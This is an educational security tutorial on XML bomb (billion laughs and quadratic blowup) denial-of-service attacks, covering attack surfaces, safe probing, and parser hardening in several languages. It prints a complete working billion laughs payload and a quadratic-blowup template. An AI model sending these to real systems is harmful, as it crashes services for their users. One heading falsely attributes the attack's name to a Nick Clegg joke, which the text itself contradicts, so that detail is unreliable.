XML Bombs: The Billion Laughs Attack

Bug Hunting • Injection Track • Denial of Service via Parser

When a 1KB file consumes 3GB of memory. Entity expansion attacks weaponize the XML specification itself — recursive definitions that fold back on themselves until the server runs out of room to think.

Exploitability: Easy
Prevalence: Occasional
Impact: Harmful
~20 min read
Section 01

What Is an XML Bomb?

The XML specification includes a feature called entity definitions. An entity is a named shortcut: define it once in a Document Type Definition (DTD), then reference it anywhere in the document using an ampersand prefix and semicolon suffix. The intent was editorial convenience — define a company name once, reuse it throughout a long document.

The problem is that entity values can themselves contain other entity references. The XML parser is required by specification to fully expand every entity reference before delivering the parsed document to the application. That means a tiny input document can produce an astronomically large expanded output — far larger than the server's available memory.

An XML bomb (also called an entity expansion attack or billion laughs attack) exploits this by defining a chain of nested entities where each level expands to multiple copies of the previous level. The attacker sends a kilobyte-sized file. The parser begins expanding, enters a recursive cascade, and either crashes, exhausts memory, or hangs until the process is killed or times out. The server never finishes parsing. All other requests it was handling may also fail.

Named After a Nick Clegg Joke
The "billion laughs" name comes from the base entity value used in the canonical example: the string "lol" (laugh out loud). Expand it to one billion copies and you get a billion laughs. The attack was first publicly documented by Bryan Sullivan in 2009 in a Microsoft MSDN article. CVE-2003-1564 covers early vulnerable libxml2 implementations.

How Entity Expansion Works (Simplified)

When an XML parser encounters a reference like &foo; it replaces it with the value defined for foo in the DTD. If that value itself contains &bar;, the parser expands that too. The expansion is recursive and must complete before the document is considered parsed.

DTD
Document Type Definition. The XML feature that allows entity names and their expansion values to be declared in a block at the top of a document.
Internal Entity
An entity whose value is defined inline in the document's own DTD. No external file or URL involved. The bomb payload is entirely self-contained.
Expansion Cascade
Each entity references several copies of the previous entity. The expansion count grows exponentially with each additional layer defined.
Parser DoS
The parser must resolve all entities before returning a result. Memory is consumed building the expanded tree. The server stalls or crashes under the load.
Section 02

The Classic Billion Laughs

The canonical payload defines ten entity levels. Each level references ten copies of the previous level. At the bottom is a base string. At the top, a single reference expands to 109 copies of that string.

classic-billion-laughs.xml — ~1KB input, ~3GB expanded output
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE lolz [ <!-- Layer 0: base string, 3 bytes --> <!ENTITY lol "lol"> <!-- Layer 1: 10 copies of &lol; = 10 x 3 bytes = 30 bytes --> <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!-- Layer 2: 10 copies of &lol2; = 10^2 = 100 copies of "lol" --> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!-- Layer 3: 10^3 = 1,000 copies of "lol" --> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!-- Layer 4: 10^4 = 10,000 copies --> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!-- Layer 5: 10^5 = 100,000 copies --> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!-- Layer 6: 10^6 = 1,000,000 copies --> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!-- Layer 7: 10^7 = 10,000,000 copies --> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!-- Layer 8: 10^8 = 100,000,000 copies --> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> <!-- Layer 9: 10^9 = 1,000,000,000 copies of "lol" (3 bytes each = ~3GB) --> <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;"> ]> <lolz>&lol10;</lolz> <!-- ^ This single reference triggers the cascade -->

Never Test Against Production or Real Systems
XML bombs cause real denial of service. Sending even a 5-level version to a live server can exhaust its XML parser's memory and crash the process. All testing must be done against isolated, authorized lab environments. Even reporting this class of vulnerability in a bug bounty requires written authorization before any testing that generates actual parser load.
Section 03

Quadratic Blowup Variant

Some XML parsers implement entity depth limits specifically to stop the exponential cascade of billion laughs. The quadratic blowup variant sidesteps these limits by using a different expansion geometry: instead of deep nesting, define one large entity and reference it many thousands of times in the document body.

Growth is quadratic rather than exponential: if the base entity is N characters and you reference it K times, the expanded output is N × K characters. Less dramatic, but sufficient to exhaust memory and CPU, and it does not trigger depth-based limits.

quadratic-blowup.xml — 50KB entity referenced 50,000 times = ~2.5GB
<?xml version="1.0"?> <!DOCTYPE bomb [ <!-- Define one large entity. No recursive nesting. --> <!-- Value is a ~50KB string of repeated characters. --> <!ENTITY a "AAAAAAAAA...AAAAAAAAA"> <!-- ~50,000 'A' characters --> ]> <bomb> <!-- Reference &a; 50,000 times in the body --> <!-- Total expanded size: 50,000 x 50,000 = 2,500,000,000 bytes --> &a;&a;&a;&a;&a;&a;&a;&a;&a;&a; <!-- (repeat 5,000 more lines) --> </bomb>

► Exponential (Billion Laughs)

  • ‣ Growth: 10N per additional layer
  • ‣ Tiny document body, complexity in DTD
  • ‣ Blocked by depth limits (most modern parsers)
  • ‣ More recognizable signature
  • ‣ 9 layers reaches 1 billion easily

► Quadratic Blowup

  • ‣ Growth: N × K per reference count
  • ‣ Large entity value, many references in body
  • ‣ Bypasses entity depth limits
  • ‣ Harder to detect at the DTD level alone
  • ‣ Requires entity expansion count limits to stop
Defense Must Cover Both Variants
A depth limit of 10 stops the exponential form. A total character limit on expanded output stops the quadratic form. Python's defusedxml and Java's secure XML factory settings address both when configured correctly. Neither variant requires external network access — both attacks are entirely self-contained within the submitted document.
Section 04

Where XML Bombs Hit

Any system that accepts XML from untrusted sources and feeds it into a parser is a potential target. The attack surface is wider than most developers realize because XML underlies many formats that do not look like raw XML from the outside.

SOAP APIs
Legacy web services and enterprise integration layers still use SOAP over HTTP. Every request body is XML. If the endpoint parses the full envelope without DTD restrictions, it is vulnerable.
SVG File Uploads
SVG is XML. An image upload endpoint that accepts SVG files and attempts to process or validate them will pass the content to an XML parser. The bomb hides inside an apparent image file.
SAML Authentication
SAML assertions are signed XML documents passed from identity providers to service providers. An attacker who can submit a crafted SAML assertion may reach the SP's XML parser before signature verification occurs.
RSS / Atom Feeds
Feed aggregators and podcast clients that fetch and parse external feeds are vulnerable if they process the full feed content including DTD sections from untrusted sources.
Office Documents
.docx, .xlsx, and .pptx are ZIP archives containing XML files. Macro-enabled or template-fetching features in office suites have historically processed embedded DTD content on document open.
Config File Parsers
Applications that accept XML configuration uploads (CI/CD pipelines, monitoring systems, network device configs) and parse them server-side are attack surface if the parser lacks entity limits.
The Hidden XML Problem
When you see a file upload endpoint labeled "Upload SVG" or "Import XLSX" or "Submit SAML response," you are looking at XML attack surface. The interface presents it as an image, spreadsheet, or authentication token, but at the parser level it is XML. DTD processing rules apply regardless of the apparent file type.
Section 05

Detection

Unlike SQL injection, you cannot confirm an XML bomb vulnerability by observing explosive behavior in production — confirming it would mean crashing the server. The goal instead is to identify indicators of vulnerable parser configurations through lightweight probes and code review.

Step 1: Identify XML-Parsing Endpoints

Look for HTTP endpoints that accept a Content-Type of application/xml, text/xml, or multipart/form-data with XML file uploads. Also look at SOAP action headers, SAML POST parameters, and any file upload accepting SVG or Office formats. These are all candidate XML parsers.

Step 2: Submit a Shallow Test Entity

Send a 3-layer expansion (not 9) to test whether DTD processing is enabled at all. Three layers produce only 1,000 copies of the base string — a few kilobytes. This is safe and informative. If the parser responds normally without error, DTD expansion is enabled and the endpoint is likely vulnerable to deeper expansion.

safe-probe.xml — 3-layer test, ~1KB expanded output, non-disruptive
<?xml version="1.0"?> <!DOCTYPE probe [ <!ENTITY a "probe"> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"> ]> <probe>&c;</probe> <!-- Expands to 100 copies of "probe" = 500 bytes --> <!-- If the server accepts this without error: DTD expansion is active -->

Step 3: Observe Behavioral Signals

  • Normal 200 response with no error: DTD expansion is enabled. The endpoint is vulnerable to deeper payloads.
  • Parser error referencing entities or DTD: The parser rejects DTD processing. Likely mitigated.
  • Error: "entity expansion limit exceeded": The parser has limits configured. Likely mitigated, but document the limit value if revealed.
  • Timeout or no response: Even the 3-layer probe caused load. High severity. Stop probing.

Step 4: Check Parser Configuration (Code Review)

If you have access to the source code, grep for XML parser initialization and look for missing security flags. The absence of hardening is the vulnerability.

# Python: check if defusedxml is NOT being used import xml.etree.ElementTree as ET # vulnerable default from defusedxml import ElementTree as ET # safe replacement # Java: check for missing XMLInputFactory hardening # Vulnerable: factory with no restrictions XMLInputFactory factory = XMLInputFactory.newInstance(); # Look for the ABSENCE of these lines: factory.setProperty(XMLInputFactory.SUPPORT_DTD, false); factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); # Check for SAXParser without secure features SAXParserFactory factory = SAXParserFactory.newInstance(); // no features set # Should have: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

Step 5: Monitor Memory During XML Operations

On an authorized test system, monitor the process memory (via top, htop, or /proc/PID/status) while submitting progressively larger entity expansion payloads. Sharp memory growth during parsing is definitive confirmation that entity limits are not enforced.

Section 06

Defense

The authoritative fix is to disable DTD processing entirely in the XML parser. When a parser does not process DTDs, entity definitions cannot be declared and entity expansion cannot occur. Both the billion laughs and quadratic blowup variants are stopped at the source.

If DTD processing is required for legitimate functionality, the fallback defense is strict entity expansion limits: cap the total number of entities that can be expanded in one parse operation and cap the total size of the expanded output.

Python — Use defusedxml

# BAD: stdlib xml.etree is vulnerable by default from xml.etree import ElementTree tree = ElementTree.parse(user_uploaded_file) # entity expansion occurs # GOOD: defusedxml drops-in as a safe replacement from defusedxml import ElementTree tree = ElementTree.parse(user_uploaded_file) # DTD processing blocked # defusedxml also protects: minidom, pulldom, lxml, xmlrpc # pip install defusedxml # If you must use lxml directly, disable DTD loading: from lxml import etree parser = etree.XMLParser(resolve_entities=False, no_network=True) tree = etree.parse(user_file, parser)

Java — Disable DTD and External Entity Processing

// APPROACH 1: SAXParserFactory — disallow DOCTYPE entirely (strongest) SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature( "http://apache.org/xml/features/disallow-doctype-decl", true // rejects any XML that contains a DOCTYPE declaration ); SAXParser parser = spf.newSAXParser(); // APPROACH 2: XMLInputFactory (StAX) — disable DTD and external entities XMLInputFactory xif = XMLInputFactory.newInstance(); xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); XMLStreamReader reader = xif.createXMLStreamReader(inputStream); // APPROACH 3: DocumentBuilderFactory — disable both features DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature( "http://apache.org/xml/features/disallow-doctype-decl", true ); dbf.setExpandEntityReferences(false); DocumentBuilder builder = dbf.newDocumentBuilder();

Node.js — Use a Safe Parser or Strip DTDs

// BAD: node-expat and some xml2js configs process entities by default const xml2js = require('xml2js'); xml2js.parseString(untrustedXml, callback); // entity expansion can occur // GOOD: fast-xml-parser with entity expansion disabled const { XMLParser } = require('fast-xml-parser'); const parser = new XMLParser({ processEntities: false, // disable entity expansion allowBooleanAttributes: true }); const result = parser.parse(untrustedXml); // ALTERNATIVE: strip DOCTYPE before parsing function safeParseXml(xmlString) { // Remove the DOCTYPE declaration entirely before any parsing const sanitized = xmlString.replace( /<!DOCTYPE[^>[]*(\[[\s\S]*?\])?\s*>/gi, '' ); return parser.parse(sanitized); }

Defense Checklist

  • Disable DTD processing in the XML parser as the first and strongest mitigation. Reject documents containing DOCTYPE declarations.
  • Set entity expansion limits if DTDs must be supported. Cap total entities expanded per parse to a small constant (e.g., 1,000).
  • Set total expanded output size limits. Reject any parse operation that would produce more than a defined maximum (e.g., 10MB) of expanded content.
  • Validate file size before parsing. A request with a 1KB body should not require more than 10KB of memory to process. Enforce this at the application layer.
  • Use defusedxml (Python) or OWASP-recommended parser settings (Java/.NET) rather than rolling custom parser hardening.
  • Apply parser limits in middleware or an XML gateway so all XML-consuming services benefit, not just the ones developers remember to harden.
  • For file uploads, validate content type at the parser level, not just the file extension. An .svg file containing a bomb is still a bomb regardless of its Content-Type header.
Section 07

XML Bombs vs XXE

Both attacks share the same root cause: a misconfigured XML parser that processes DTD content from untrusted input without restrictions. But they exploit different parser capabilities for different purposes.

Dimension XML Bomb (Entity Expansion) XXE (External Entity)
Entity type Internal entities (value defined in the DTD itself) External entities (value loaded from a file path or URL)
Primary goal Denial of Service — crash the parser, exhaust memory Data exfiltration — read local files, probe internal network
Network access None required. The bomb is fully self-contained. Required for external entity resolution (file:// or http://)
Requires reflection No. The damage is done during parsing regardless of output. Usually yes, for in-band data retrieval. OOB channels bypass this.
CVSS impact Availability primary Confidentiality primary, Availability secondary
Detectability Low overhead to probe safely with 2-3 layers Blind OOB variants require out-of-band listener to confirm
Root fix Disable DTD processing entirely. Same fix covers both attack classes.
✓
Same Surface, Different Weapons
When you find a SOAP endpoint or SVG upload that processes XML, test for both. XXE is the data breach. XML bombs are the availability kill switch. A finding that demonstrates both on the same endpoint carries higher severity in your report because it shows the full threat model: an attacker can exfiltrate secrets or knock the service offline from the same malformed document. The fix — disabling DTD processing — closes both simultaneously.
